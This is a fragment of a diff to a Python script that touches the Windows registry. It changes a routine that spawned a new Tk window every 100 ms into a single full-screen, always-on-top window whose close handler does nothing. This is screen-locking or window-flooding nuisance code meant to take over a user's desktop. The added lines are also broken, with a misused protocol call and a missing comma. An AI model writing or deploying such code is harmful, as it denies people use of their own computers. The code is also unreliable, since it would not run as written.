@@ -27,10 +27,10 @@ winreg.CloseKey(key)
 def on_close():
     pass
 
-def spawn_window():
-    root = Tk()
-    root.protocol("WM_DELETE_WINDOW", on_close)
-    root.after(100, spawn_window)
-    root.mainloop()
+root = Tk()
+root.protocol("WM_DELETE_WINDOW", on_close)
 
-spawn_window()
+root.protocol("-fullscreen", True)
+root.protocol("-topmost" True)
+
+root.mainloop()
